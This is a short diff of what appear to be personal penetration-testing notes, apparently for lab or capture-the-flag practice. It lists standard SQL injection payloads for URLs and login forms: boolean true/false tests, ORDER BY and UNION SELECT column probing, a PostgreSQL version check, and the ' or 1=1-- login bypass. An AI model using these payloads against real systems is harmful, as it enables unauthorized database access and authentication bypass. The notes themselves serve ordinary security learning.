@@ -154,9 +154,12 @@ sudo openvpn nmap -sV {target IP}
 [+] {'+and+1=1--} --test TRUE in URL
 [+] {'+and+1=0--} --test FASLE in URL
 [+] {'Order+by+1--}/ test for FALSE(large orderby number) too --test table order SQLi in URL
-[+] {'union+select+NULL,NULL--} --slect from table in URL
-- {'union+select+'a',NULL--} --string tabel search in URL
-- 
+[+] {'+union+select+NULL,NULL--} --slect from table in URL
+- {'+union+select+'a',NULL--} --string tabel search in URL
+- {'+union+select+version(),NULL--} --POSTGRE db version check in URL
+- {'+union+select+'a',NULL--}
+
+
 [+] test login with {'} if internal error shows then it allows SQLi
 [+] {' or 1=1--} -- bypass login page pass
 [+] 
